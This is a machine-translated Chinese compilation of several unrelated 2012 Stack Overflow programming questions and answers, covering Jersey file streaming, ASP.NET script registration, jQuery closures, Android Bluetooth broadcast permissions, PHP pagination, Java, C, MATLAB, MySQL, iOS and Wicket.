第 3 方服务正在使用 HttpClient (3.1) 获取我通过 Jersey（在 tomcat 上）提供的 url。它在主题中抛出错误。

这就是我提供 URL 的方式：

```
@Path("somepath")
@GET
@Produces(MediaType.APPLICATION_OCTET_STREAM)
public Response download(@Context UriInfo uriInfo)  {
    try {
        URL url = // find the actual URL (a file)
        InputStream stream = url.openStream();
        return Response.ok(stream).build();
    } catch (IOException e) {
        return Responses.notFound().build();
    }
} 
```

有没有办法解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-10T03:31:57.393

我最终做了这样的事情：

```
if (url.getScheme().equalsIgnoreCase("file")) {
  File file = new File(url.toURI());
  return Response.ok(file).header("Content-Length", file.length()).build();
} else {
  return Response.seeOther(url);
} 
```

这适用于我的用例。

一些注意事项：

*   如果文件的大小很小（大约 2G），则仅返回文件对象有效，但对于较大的文件则失败。我假设由于整数溢出，某种分块长度编码会中断。
*   尝试返回 StreamingOutput （在另一个问题中建议）也不适用于大文件。

# c# - 我在页面中有两个 javascript 块，一个是添加 dynamicllay ，即提供所有图像。应该在页面上现有的 javascript 之上添加

> ID：12192791
> 
> 赞同：0
> 
> 时间：2012-08-30T08:26:35.193
> 
> 标签：c#, javascript, asp.net

我正在使用以下代码动态添加 javascript

```
 HtmlGenericControl scriptTagLinks = new HtmlGenericControl("script");
 scriptTagLinks.Attributes["type"] = "text/javascript";
 var scrip = "var aImgs=[" + appendString.ToString().TrimEnd(new char[] { ',' }) + "]";
  scriptTagLinks.InnerHtml = scrip; 
```

Javascript 正在添加到 ascx 页面。但我的问题是我在页面中有两个 javascript 块，一个是添加 dynamicllay ，即提供所有图像。另一个 javascript 如下。

```
<script type="text/javascript>
     window.onload = function () {
     for (var i = 0; i < aImgs.length; i++) {
            var oImg = new Image();
            oImg.src = aImgs[i];
            aImages.push(oImg);

            oImg.onload = function () {
                textureWidth = oImg.width;
                textureHeight = oImg.height;
            }
        }} 
</script> 
```

但在脚本下方添加了动态创建的 javascript。但应该像这样在脚本上方添加。

```
 <script type="text/javascript">
        var aImgs = [
        'DesktopModules/DNAiusCubeImages/Check/pic1.jpg',
        'DesktopModules/DNAiusCubeImages/Check/pic2.jpg',];
    </script>
<script type="text/javascript>
         window.onload = function () {
         for (var i = 0; i < aImgs.length; i++) {
                var oImg = new Image();
                oImg.src = aImgs[i];
                aImages.push(oImg);

                oImg.onload = function () {
                    textureWidth = oImg.width;
                    textureHeight = oImg.height;
                }
            }} 
    </script>How can i achieve this . 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:34:44.693

你能试试这样做吗。

```
 // Form the script that is to be registered at client side.
   String scriptString = "<script language=JavaScript> function DoClick() {";
   scriptString += "myForm.show.value='Welcome to Microsoft .NET'}<";
   scriptString += "/";
   scriptString += "script>";

       if(!this.IsClientScriptBlockRegistered("clientScript"))
          this.RegisterClientScriptBlock("clientScript", scriptString); 
```

MSDN 中的示例 [http://msdn.microsoft.com/en-us/library/system.web.ui.page.registerclientscriptblock%28v=vs.71%29](http://msdn.microsoft.com/en-us/library/system.web.ui.page.registerclientscriptblock%28v=vs.71%29)

客户端脚本在 Page 对象元素的开始标记之后发出。脚本块在定义呈现输出的对象时发出，因此您必须包含元素的两个标签。

通过使用键标识脚本，多个服务器控制实例可以请求脚本块，而无需将其发送到输出流两次。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:45:42.253

看看 ScriptManager.RegisterStartupScript。您可以添加没有事件 onLoad 的脚本。只是一个接收图像路径数组的函数。

然后使用 Page.ClientScript.RegisterStartupScript(...); 从服务器端代码的 OnLoad 事件中，您可以调用您的 Javascript 函数并传递您需要的参数（数组）。

# jquery - 将变量传递给 jquery eq() 函数不起作用

> ID：12192792
> 
> 赞同：2
> 
> 时间：2012-08-30T08:26:37.030
> 
> 标签：jquery, for-loop, global-variables, blur

对于每一个我想通过下面的脚本`tr`来区分一个`td`包含`span`文本和另一个`td`包含一个`input`框`input`的区别：`td`

```
$(function() {
    var tr_no = $('.unitrows').length;
    for (i = 0; i < tr_no; i++) {
        $('.samples2issue input').eq(i).blur(function() {
            var diff = $('.samples_available span').eq(i).text() - $(this).val();
            alert(diff);
        })
    }
})​ 
```

问题是在计算中用`i`数字替换变量。但是使用本身返回一个-ve值。含义返回 0。`0``var diff``i``$('.samples_available span').eq(i).text()`

可能是因为`i`在函数外部定义`blur()`并且没有全局设置它在`blur()`函数内部时没有被选中。

或者我如何能够使用该`each()`功能复制它？

谢谢你。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-30T08:30:46.113

问题是事件处理程序中的代码在`i`循环完成后使用变量，因此它将比最后一个元素的索引多一个。

使用闭包在每次迭代中捕获变量的值：

```
for (var i = 0; i < tr_no; i++) {

  (function(i){

    $('.samples2issue input').eq(i).blur(function(){
      var diff = $('.samples_available span').eq(i).text() - $(this).val();
      alert(diff);
    });

  })(i);

} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-30T08:30:21.333

您可以在循环`i`之前简单地在全局范围内定义：`for`

```
var i = 0;
for(; i<tr_no; i++){
    ...
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-30T08:33:47.580

我没有看到 html，但更清晰的 jquery 将是这个。

```
$('.unitrows').each(function(i){
  $('.samples2issue input').eq(i).blur(function(){
     var diff = $('.samples_available span').eq(i).text() - $(this).val();
     alert(diff);
  });
}); 
```

编辑：我按照 Guffa 的建议将差异放回事件处理程序中。

# iphone - 如何为 iPhone 应用设置 Netflix 支付模式？

> ID：12192796
> 
> 赞同：1
> 
> 时间：2012-08-30T08:27:03.723
> 
> 标签：iphone, app-store, payment, netflix

我的应用程序即将上市，但我在定价方面有点挣扎。我认为最好的定价方案类似于 netflix 模型，例如，您在输入信用卡**后第一个月免费。**然后，您必须取消订阅才能取消订阅。

但是，我一直在研究如何为通过 appstore 分发的 iPhone 应用程序执行此操作，并且似乎很难设置。您需要拥有自己的服务器，并且客户需要通过您的网站进行注册。这听起来很复杂，坦率地说，我宁愿尽快将产品推向市场。

有谁知道建立 Netflix 风格支付模式的更简单方法？我打算使用 appstore 促销代码并将它们提供给我的目标市场，但似乎它们仅在美国可用。我在欧盟。

如何在开始收费之前免费提供一个月左右的应用程序以建立用户群？

您可以在这方面给我的任何帮助将不胜感激。

# https - https 不适用于 127.0.0.1/localhost 但适用于 IP/DNS

> ID：12192797
> 
> 赞同：0
> 
> 时间：2012-08-30T08:27:05.420
> 
> 标签：https, iis-7.5, localhost

我正在运行 IIS 7.5（Windows Server 2008 R2 64 位）。我在默认网站上运行了一个 Web 应用程序（只有那个网站） 我在这个网站上安装了 SSL 证书。我可以看到，在服务器外部 IP 或 DNS 上访问应用程序时，https 工作得很好。无论是从外部访问还是内部访问。

当我从内部访问应用程序并使用主机名、localhost 或 127.0.0.1 时，我收到标准 IE 错误“Internet Explorer 无法显示网页”，这通常表明 https 没有运行。我可以 telnet 127.0.0.1 443 就好了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:46:16.233

https 127.0.0.1 有效吗？而不是只使用http。

# android - 蓝牙意图权限被拒绝

> ID：12192802
> 
> 赞同：1
> 
> 时间：2012-08-30T08:27:23.800
> 
> 标签：android, permissions, bluetooth

我试图通过下面提到的意图，但我在下面得到以下异常。有人对此有任何想法吗？？？？

```
Intent intent = new Intent(BluetoothHeadset.ACTION_CONNECTION_STATE_CHANGED);
intent.putExtra(BluetoothProfile.EXTRA_PREVIOUS_STATE, prevState);
intent.putExtra(BluetoothProfile.EXTRA_STATE,BluetoothAdapter.STATE_CONNECTED);
intent.putExtra(BluetoothDevice.EXTRA_DEVICE, mdevice);
sendBroadcast(intent); 
```

**java.lang.SecurityException: Permission Denial: not allowed to send broadcast android.bluetooth.headset.profile.action.CONNECTION_STATE_CHANGED from pid=10459, uid=10126**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:41:05.127

`ACTION_CONNECTION_STATE_CHANGED`是一个受保护的意图，只能由 Android 广播。您不能广播受保护的意图。

这主要是为了保护这个意图的接收者免受来自无法改变蓝牙耳机状态的应用程序的虚假意图。

为什么在没有改变状态的情况下要发送这个意图？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:30:56.387

你在清单中添加了权限吗？

```
<uses-permission android:name="android.permission.BLUETOOTH" /> 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-30T08:29:56.017

你加了吗

```
<uses-permission android:name="android.permission.BLUETOOTH" /> 
```

在你的清单中？

# php - 继续编号 PHP

> ID：12192803
> 
> 赞同：-2
> 
> 时间：2012-08-30T08:27:27.007
> 
> 标签：php, database

我在一个页面（.php）上工作，该页面显示来自数据库的一些信息（如文章名称，文章作者）。我还有一个工作良好的分页脚本（分页脚本的想法是当我按下链接时网站的 url转到类似 ?page=2) 现在我尝试对显示表单数据库的记录进行编号。但我该怎么做呢？

分页脚本：

```
$per_pages = 6;
$nrofarticles_query = mysql_query("SELECT COUNT('id') FROM tbl_articles");
$nrdearticole = mysql_result($nrofarticles_query, 0);
$totalpages = ceil($nrdearticole/$per_pages);
$currentpagedisplay = (isset($_GET['page'])) ? (int)$_GET['page'] : 1;
$firstpair = ($currentpagedisplay - 1) * $per_pages; 
```

我从数据库中回显记录，如下所示：

```
$articles_set = mysql_query("SELECT * FROM tbl_articles LIMIT $firstpair, $per_pages");
while($article = mysql_fetch_array(article_set)){
     echo $article['article_name'];
} 
```

因此，我在页面更改时显示数据库中的 6 条记录，显示接下来的 6 条记录，或者如果少于 6 条，则显示剩余的数量。我如何对这样的记录进行编号：

```
?page=1
1 article_name1
2 article_name2
3 article_name3
....
6 article_name6

?page=2
keep going
7 article_name7
8 article_name8
..... 
```

**编辑**

我在想类似的东西

```
 <?php
    $nrofarticles = 0;
    $articles_set = mysql_query("SELECT * FROM tbl_articles LIMIT $firstpair,$per_pages");
    confirm($articles_set);
    while($article = mysql_fetch_array($articles_set)){
        $nrofarticles ++;
    }
    echo "<ul id=\"id\">";
        for($i = $firstpair+1; $i<=$nrofarticles * $currentpagedisplay; $i++){
                echo '<li class="nr_id">' .$i. '<sub>#</sub></li>';
        }
    echo "</ul>";
?> 
```

它有效，但仅在 3 的前 2 页，因为我总共有 16 篇文章 - 所以在最后一页 $firstpair + 1 将是 13 并且 $nrofarticles * $currentpagedisplay 将是 12(4(articles) * 3(page=3) ）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T09:55:33.753

Go use a framework. You'll get pagination (and all sorts of extras) for free.

# java - 将整数转换为字符数组：java

> ID：12192805
> 
> 赞同：27
> 
> 时间：2012-08-30T08:27:37.797
> 
> 标签：java, arrays, casting, type-conversion

将整数转换为字符数组的最佳方法是什么？

输入：1234

输出：{1,2,3,4}

牢记 Java 语言的广度，最好和最有效的方法是什么？

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2012-08-30T08:28:38.773

```
int i = 1234;
char[] chars = ("" + i).toCharArray(); 
```

* * *

## 回答 #2

> 赞同：47
> 
> 时间：2012-08-30T08:29:13.953

您可以尝试以下方法：

```
String.valueOf(1234).toCharArray(); 
```

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2012-08-30T08:30:46.470

试试这个...

```
int value = 1234;
char [] chars = String.valueOf(value).toCharArray(); 
```

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2017-02-04T08:59:46.430

您可以将该整数转换为字符串，然后将该字符串转换为 char arary：-

```
int i = 1234;
String s = Integer.toString(i);
Char ch[] = s.toCharArray();

/*ch[0]=1,ch[1]=2,ch[2]=3,ch[3]=4*/ 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2018-10-01T18:10:50.787

这会将 int 转换为 2 char 数组。如果您试图获得最少数量的字符，请尝试此操作。

```
//convert int to char array

int valIn = 111112222;

ByteBuffer bb1 = ByteBuffer.allocate(4);
bb1.putInt(valIn); 

char [] charArr = new char[4];
charArr[0] = bb1.getChar(0);
charArr[1] = bb1.getChar(2);

//convert char array to int

ByteBuffer bb2 = ByteBuffer.allocate(8);
bb2.putChar(0,charArr[0]);
bb2.putChar(2,charArr[1]);

long valOut = bb2.getInt(0); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-11-18T15:57:12.337

我在谷歌面试中被问到这个问题。如果在面试中询问使用模块和部门。这是答案

```
List<Integer> digits = new ArrayList<>();
//main logic using devide and module
for (; num != 0; num /= 10)
    digits.add(num % 10);

//declare an array
int[] arr = new int[digits.size()];
//fill in the array
for(int i = 0; i < digits.size(); i++) {
    arr[i] = digits.get(i);
}
//reverse it.
ArrayUtils.reverse(arr); 
```

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2016-12-07T18:40:46.350

假设您有一个整数数组和另一种将这些整数转换为字母的方法，例如将数字等级更改为字母等级的程序，您会这样做...

```
public char[] allGradesToLetters()
   {
      char[] array = new char[grades.length];

      for(int i = 0; i < grades.length; i++)
      {
         array[i] = getLetter(grades[i]);
      }

      return array;
   } 
```

# c - 这些 struct 和 typedef 定义是什么意思？

> ID：12192806
> 
> 赞同：0
> 
> 时间：2012-08-30T08:27:37.763
> 
> 标签：c, struct, typedef

我有以下代码，它工作正常并且已经使用了很长时间......但我不知道它是什么意思。

```
struct event_param
{
    int task:3;
    int param1;
    int param2;
};

#define SV_DRIVER_EVENTS_MASK_SIZE (SV_DRIVER_EVENT_LAST*sizeof(struct event_param))
typedef struct event_param driver_event_mask[SV_DRIVER_EVENTS_MASK_SIZE];
typedef driver_event_mask DriverEventMask; 
```

*   代表什么`driver_event_mask`？
*   为什么`sizeof(struct event_param)`在数组里面？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:34:37.817

`:3`事物代表一个[位](http://en.wikipedia.org/wiki/Bit_field)域。不过，我不确定这很重要，因为`sizeof(struct event_param)`我认为仍然几乎可以肯定是 12 个字节。

所以这里发生的是创建了一个`SV_DRIVER_EVENT_LAST`结构`event_param`数组。但我也希望`sizeof(struct event_param)`这里没有必要 - 数组的长度是根据它包含的单位数定义的，而不是字节数。

**1.** `driver_event_mask`就是它所说的。表示 SV_DRIVER_EVENTS_MASK_SIZE 结构 event_param 项数组的类型。

**2.** `sizeof(struct event_param)`这里不需要，但不会造成伤害（即不会导致错误），因为它只是意味着您分配的内存大约是实际需要的 12 倍。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-08-30T08:46:11.647

*如何在 c 中 typedef strcuts 数组？*

您的问题中已经显示了如何定义，为什么请参考以下内容：-

> 如果 typedef 名称表示可变长度数组类型，则数组的长度在定义 typedef 名称时是固定的，而不是每次使用时：

*`DriverEventMask`代表什么*

> DriverEventMask 表示 struct event_param

*为什么有* `sizeof(struct event_param)`

> 这样 SV_DRIVER_EVENTS_MASK_SIZE 将代表 struct event_param 的大小。这个结构包含位字段，并且在我们知道是否有任何编译器指令可以避免填充之前，它的排列方式是不确定的。

# javascript - 如果元素具有 A 类，则在鼠标离开时停止悬停效果

> ID：12192809
> 
> 赞同：2
> 
> 时间：2012-08-30T08:28:03.970
> 
> 标签：javascript, jquery, hover

这是我的整个 jquery 代码：

```
$(function(){
    $(".sc").hover(function(){
        $(".sc span.L1").animate({marginRight:'0px'},100);
        $(".sc span.L2").animate({marginRight:'28px'},200);
        $(".sc span.L3").animate({marginRight:'5px'},300);
        $(".sc span.L4").animate({marginRight:'19px'},400);
    }, function(){
        $(".sc span.L1").animate({marginRight:'0px'},100);
        $(".sc span.L2").animate({marginRight:'0px'},200);
        $(".sc span.L3").animate({marginRight:'0px'},300);
        $(".sc span.L4").animate({marginRight:'0px'},400);
    });
    $(".sc").click(function(){
        if ($(".sc div#trigger").hasClass('passive')){
                $(".sc div#trigger").removeClass('passive');
                $(".sc div#trigger").addClass('active');
            }
            else { 
                $(".sc div#trigger").addClass('passive');
                $(".sc div#trigger").removeClass('active');
            };

    }); 
```

如果 div#trigger.hasClass('passive')，我想停止悬停效果。这意味着如果 div#trigger 的类是“被动的”，我希望禁用悬停效果，并且当类是“主动”时，启用..

我怎么能使用这个代码？！

```
if ($(".sc div#trigger").hasClass('passive')) {
// codes to stop hover effect
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:37:02.540

```
$(function(){
    $(".sc .active").hover(function(){
        $(".sc span.L1").animate({marginRight:'0px'},100);
        $(".sc span.L2").animate({marginRight:'28px'},200);
        $(".sc span.L3").animate({marginRight:'5px'},300);
        $(".sc span.L4").animate({marginRight:'19px'},400);
    }, function(){
        $(".sc span.L1").animate({marginRight:'0px'},100);
        $(".sc span.L2").animate({marginRight:'0px'},200);
        $(".sc span.L3").animate({marginRight:'0px'},300);
        $(".sc span.L4").animate({marginRight:'0px'},400);
    });
    $(".sc").click(function(){
        if ($(".sc div#trigger").hasClass('passive')){
                $(".sc div#trigger").removeClass('passive');
                $(".sc div#trigger").addClass('active');
            }
            else { 
                $(".sc div#trigger").addClass('passive');
                $(".sc div#trigger").removeClass('active');
            };

    }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:35:03.213

选择器`'.sc div#trigger'`不必要地冗长；由于 id 是唯一的，只需使用：`'#trigger'`

```
$(function(){
    $('.sc').hover(function(){
        if ( $("#trigger").hasClass('active') ) {
            $(".sc span.L1").animate({marginRight:'0px'},100);
            $(".sc span.L2").animate({marginRight:'28px'},200);
            $(".sc span.L3").animate({marginRight:'5px'},300);
            $(".sc span.L4").animate({marginRight:'19px'},400);
        }
    }, function(){
        if ( $("#trigger").hasClass('active') ) {
            $(".sc span.L1").animate({marginRight:'0px'},100);
            $(".sc span.L2").animate({marginRight:'0px'},200);
            $(".sc span.L3").animate({marginRight:'0px'},300);
            $(".sc span.L4").animate({marginRight:'0px'},400);
        }
    });
    // ...
});
​ 
```

* * *

此外，关于您的点击事件，也可以在此处减少一些冗长；jQuery 库中一个鲜为人知/使用过的函数[`.toggleClass()`](http://api.jquery.com/toggleClass)可以添加/删除一个类，具体取决于它是否存在。由于您可以通过在单个字符串中指定名称同时在多个类上触发此效果，因此这一点变得更加强大：

```
$(".sc").click( function() {
    $("#trigger").toggleClass('passive active');
}); 
```

由于此处的元素一次只能处于一种状态，因此只需关闭当前与该元素关联的任何一个，然后打开另一个。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-30T08:34:59.933

可能是您正在寻找的东西：

```
if ($('.sc div#trigger').hasClass('passive')) {
  $('.sc span').stop(true, true);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-30T08:44:04.907

丢失 div#trigger 中的 div，你不需要它，因为 ID 唯一地代表 DOM 树中的一个对象，如果你想改变一个元素的类，你可以通过两种方式......

```
$(".sc #trigger").toggleClass("active");
$(".sc #trigger").toggleClass("pasive"); 
```

当然，需要从一开始就初始化

现在回答您的问题，只需使用`.stop()`- 就这么简单

# matlab - 比较图像的两个坐标值

> ID：12192810
> 
> 赞同：1
> 
> 时间：2012-08-30T08:28:10.320
> 
> 标签：matlab

我有一组坐标值，我想将这些值相互比较。我想要 x-min, x-max,y-min ,y-max 作为结果。例如： (10,40) 和 (20,30) 是两组值。我想比较它们；结果应该是：

```
x-min=10
y-min=30
x-max=20
y-max=40 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:35:24.197

如果您有单独的数组`x`and `y`，请参阅@Andrey 的答案。如果你有一个像

```
A = [x y] = [
    10 40
    20 30
    ..
    90 25]; 
```

然后使用这个：

```
mins = min(A);
maxs = max(A); 

minX = mins(1);   maxX = maxs(1);
minY = mins(2);   maxY = maxs(2); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:30:18.420

听起来很容易：

```
max(x(:));  %#Get the maximal value.
min(x(:));  %#Get the minimal value.
max(y(:));  %#Get the maximal value.
min(y(:));  %#Get the minimal value. 
```

现在你可以比较它们了。

# iphone - 在 Windows 7 上开发 iPhone 应用程序

> ID：12192813
> 
> 赞同：1
> 
> 时间：2012-08-30T08:28:26.387
> 
> 标签：iphone, windows

我想在 Windows 平台上开发一个 iPhone 应用程序。我的系统上安装了 Windows 7。最近我知道我们也可以在 Windows 上制作 iPhone 应用程序。

几天后，我在我的窗口机器上安装了制作 iPhone 应用程序的软件，但不知何故我感染了病毒。因此，在再次采取此步骤之前，我想知道是否可以在 Windows 7 上制作 iPhone 应用程序。如果可以，那么最好的方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:32:35.707

您的目标可能是[Xamarin 之](http://xamarin.com/)类的东西。

尽管 iDevices 的开发应该可以在 Windows 机器上进行，但最好的体验可能总是在 OSX 设备上。

在 Windows 机器上，您总是需要做一些额外的工作来调试、模拟等。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-30T08:50:14.433

不要忘记 Monocross：[http ://www.monocross.net/](http://www.monocross.net/)

或 VS Nomad：[http ://www.vsnomad.com/](http://www.vsnomad.com/)

# s#arp-architecture - S#arp Architecture 1.9.5 到 2.x 的升级路径？

> ID：12192814
> 
> 赞同：0
> 
> 时间：2012-08-30T08:28:28.780
> 
> 标签：s#arp-architecture

我有一个相当大的电子商务网站在 S#arp Arch 1.9.5 上运行。我刚刚看到代码库达到了 2.0.4。首先，对所有相关人员都很好，我认为在等待 2.x 很长一段时间后它已经死了（......和 ​​Ayende 撕开它）。

有没有推荐的从 1.9.5 升级到最新版本的路径？我只是 nuget update-package 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T17:02:03.170

我通过从 Github 下载 2.0.4 包（见下文）亲自升级了我的实例，然后在本地更新它。我没有遇到任何问题。像你一样，我寻找更新建议，但决定手动进行。

[https://github.com/sharparchitecture/Sharp-Architecture/downloads](https://github.com/sharparchitecture/Sharp-Architecture/downloads)

我确实在 Nuget 找到了 2.0.4 Sharp-architecture 包，但是我没有在我的应用程序中运行 nuget update-package。

# mysql-5.1 - MySql 查询以选择具有下一个更低或更高日期的行

> ID：12192817
> 
> 赞同：0
> 
> 时间：2012-08-30T08:28:40.600
> 
> 标签：mysql-5.1

假设我从具有最大日期值的表中选择了这些数据，如下所示：

```
SELECT * FROM  table_name WHERE column_name IN  (SELECT  MIN(column_name) FROM table_name 
```

它工作正常，它选择那些具有“最新”日期值的数据。

我想知道 MySQL 中是否有一个查询来列出那些具有下一个降序日期的数据。例如，在我的第一个选择中，我选择了那些具有 MIN 日期值的行，如下所示：2012-08-27 10:15:00 我想要另一个查询来选择那些日期值最接近的数据像这样的值：2012-08-28 11:45:00

所以还有其他日期值更大或更低的行，但我不想选择它们。从我目前的情况来看，只有最近的下一个。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T08:36:33.330

如果您有一个日期时间的值，您想要找到 *其最近的下一个元素（让我们将其命名为***comparison_date**），您可以尝试这样的事情：

```
SELECT * FROM  table_name WHERE column_name IN  (SELECT  MIN(column_name) FROM table_name WHERE column_name > comparison_date ORDER BY column_name) 
```

这将返回晚于该日期的所有日期时间值。如果要将其限制为单个结果，则应使用：

```
SELECT * FROM  table_name WHERE column_name IN  (SELECT  MIN(column_name) FROM table_name WHERE column_name > comparison_date ORDER BY column_name) LIMIT 1 
```

或者，如果您想要与当前时间最接近的日期时间，您可以将**comparison_date** 替换为 MySQL 函数**NOW() 。**然后，你可以尝试这样的事情：

```
SELECT * FROM  table_name WHERE column_name IN  (SELECT  MIN(column_name) FROM table_name WHERE column_name > NOW() ORDER BY column_name) 
```

为了找到下一个较低的日期时间（或以前的日期时间，我们称之为），您应该使用：

```
SELECT * FROM  table_name WHERE column_name IN  (SELECT  MIN(column_name) FROM table_name WHERE column_name < comparison_date ORDER BY column_name DESC) LIMIT 1 
```

# iphone - 如何在 iOS 中制作其他语言的键盘

> ID：12192818
> 
> 赞同：2
> 
> 时间：2012-08-30T08:28:41.973
> 
> 标签：iphone, ios, uikeyboard, uikeyboardtype, uikeyinput

我想创建一个不同于 iPhone 键盘的高棉键盘。我怎样才能做到这一点 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:33:41.183

不幸的是，您无法控制键盘的语言。用户通过设置应用程序选择他们希望使用的键盘，并可以使用键盘上的地球图标在它们之间切换。打开键盘时，它将打开最近使用的键盘。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-30T08:46:02.690

制作自定义键盘。取一个 UIView 添加 UIButton 并在此视图中添加您想要的所有内容。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-02T07:41:27.440

从 iOS 4 开始，UITextField 和 UITextView 都有一个名为 inputView 的属性。它应该是一个能够接收点击并发送到包含您的文本字段的 UIViewController 的视图。因此，可以使用委托方法创建一个 UIViewController，并将其视图设置为 UITextField 或 UITextView 的 inputView。因此，假设 MyCustomKeyboard 是作为您的键盘的 UIViewController，包括视图和委托方法，在您的视图控制器的 viewDidLoad 中，您应该放置：

```
MyCustomKeyboard *customKeyboard = [[MyCustomKeyboard alloc] init];
customKeyboard.delegate = self;
myTextField.inputView = customKeyboard.view; 
```

在您的视图控制器中，您处理 MyCustomKeyboard 类的委托方法。

如果你想要一个教程，[Ray Wenderlich 网站上有一个很好](http://www.raywenderlich.com/1063/ipad-for-iphone-developers-101-custom-input-view-tutorial)的教程，你应该做一些类似于 iPhone 的东西。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-02T07:20:20.750

我不认为它可以只为一个应用程序完成，两个选项：

*   用户必须更改为正确的语言。

由于这不是您想要的，因此有选项 2：

*   实现自己的键盘（=大量工作）

# c# - 查找网格中单元格的标题值

> ID：12192823
> 
> 赞同：0
> 
> 时间：2012-08-30T08:29:08.420
> 
> 标签：c#, asp.net, header, grid, findcontrol

我有**gridview**，我想对其行进行 foreach 并*从列标题中获取值，* 其中该行中一个单元格的标签。

```
foreach (GridViewRow mainRow in grid1.Rows)
{
    var header = mainRow.Cells[2].Parent.FindControl("LabelID");//is null
} 
```

我如何找到它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:45:03.283

如果您想要 RowDataBound 事件中的值，那么您可以像这样检查 RowType

```
if(e.Row.RowType == DataControlRowType.Header)
{
    Label header = (Label)e.Row.FindControl("LabelID");
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:57:18.953

我将访问**headerRow**并*枚举相应的单元格*（在*buttonClick*或*RowDataBound* ...）

**默认.aspx**

```
<asp:GridView AutoGenerateColumns="false" ID="GridView1" runat="server">
    <Columns>
        <asp:TemplateField>
            <HeaderTemplate>
                <asp:Label ID="headerLabel1" runat="server" Text="Headercolumn1"></asp:Label>
            </HeaderTemplate>
            <ItemTemplate>
                <asp:Label ID="itemLabel1" runat="server" Text='<%# Eval("name") %>' />
            </ItemTemplate>
        </asp:TemplateField>
    </Columns>
</asp:GridView>
<asp:Button ID="btnGetHeader" runat="server" Text="GetHeader" OnClick="btnGetHeader_Click" /> 
```

**默认.aspx.cs**

```
protected void btnGetHeader_Click(object sender, EventArgs e)
{
    foreach (TableCell headerCell in GridView1.HeaderRow.Cells)
    {
        // or access Controls with index 
        //     headerCell.Controls[INDEX]
        Label lblHeader = headerCell.FindControl("headerLabel1") as Label;
        if (lblHeader != null)
            Debug.WriteLine("lblHeader: " + lblHeader.Text);
    }
} 
```

# c# - 任务可以在非后台线程中启动吗？

> ID：12192824
> 
> 赞同：1
> 
> 时间：2012-08-30T08:29:08.610
> 
> 标签：c#, multithreading, task-parallel-library

我需要在主线程退出后允许任务执行。是否可以？或者我应该为此目的明确使用 Thread 类？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T08:34:09.933

您可以编写自己的任务调度程序来安排非线程池线程上的任务......但更简单的选择可能是启动一个前台线程，它只等待相关任务完成。

（很难给出代码示例，因为您没有展示任务是如何开始的等，但它应该相当容易。）

# java - 检票口中的日历

> ID：12192827
> 
> 赞同：4
> 
> 时间：2012-08-30T08:29:15.030
> 
> 标签：java, calendar, wicket

我想在检票口有一个简短的小日历。DatePicker 是一个具有 textField 的组件，并且日历会在短时间内显示，直到您选择日期。但我需要永久日历，就像在 Outlook 中一样。Wicket FullCalendar 对我来说非常大，我需要 datePicker 格式之一。有没有这样的成分？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T09:45:04.183

我不认为，核心检票口中有一个现成的组件。但它应该很容易推出你自己的。这里有一些想法：

*   抓住 DatePicker 并从那里提取日历（注意 DatePicker 在内部使用 YUI）。
*   查看WiQuery 项目中的[WijCalendar 组件](http://code.google.com/p/wiquery-plugins/source/browse/trunk/wiquery-plugins/wiquery-wijmo/src/main/java/org/odlabs/wiquery/wijmo/wijcalendar/WijCalendar.java?r=211)
*   只需将值呈现为表格，应用 CSS 并让 jQuery 的 Themeroller 试一试。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T09:40:08.620

最近我也需要这样的日历小部件。但是一个也找不到。Wicket 日历选择器基于[YUI 组件](http://developer.yahoo.com/yui/examples/calendar/index.html)。尽管基本组件支持内联显示，但我找不到触发此模式的检票口日期选择器的任何参数。

最后我想出了编写自己的简单组件。它使用[JQueryUI 日历小部件](http://jqueryui.com/demos/datepicker/#inline)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-30T10:14:21.243

还可以看看 Webical 项目。它是用 Wicket 编写的，它的 GUI 中有你需要的东西：[http ://code.google.com/p/webical/wiki/Screenshots](http://code.google.com/p/webical/wiki/Screenshots)

# makefile - 使用 Makefile 重建目标文件

> ID：12192832
> 
> 赞同：0
> 
> 时间：2012-08-30T08:29:20.707
> 
> 标签：makefile

有没有办法根据变量的值来重建某个目标？

